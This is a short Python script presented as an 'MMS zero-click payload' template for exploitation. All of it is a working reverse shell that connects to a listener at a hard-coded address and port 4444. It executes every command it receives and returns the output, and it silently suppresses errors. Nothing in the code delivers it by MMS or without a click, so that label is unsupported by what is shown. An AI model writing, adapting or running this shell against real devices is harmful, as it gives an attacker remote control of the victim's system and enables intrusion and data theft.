# Megalodon MMS Zero-Click Payload
# This is a template for MMS-based exploitation
# When triggered, it connects back to the listener

import subprocess
import time
import socket

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.18.11', 4444))
        s.send(b'[+] MMS Payload Connected\n')
        
        while True:
            cmd = s.recv(1024).decode()
            if not cmd:
                break
            result = subprocess.getoutput(cmd)
            s.send(result.encode() + b'\n')
        s.close()
    except:
        pass

if __name__ == "__main__":
    time.sleep(2)
    reverse_shell()
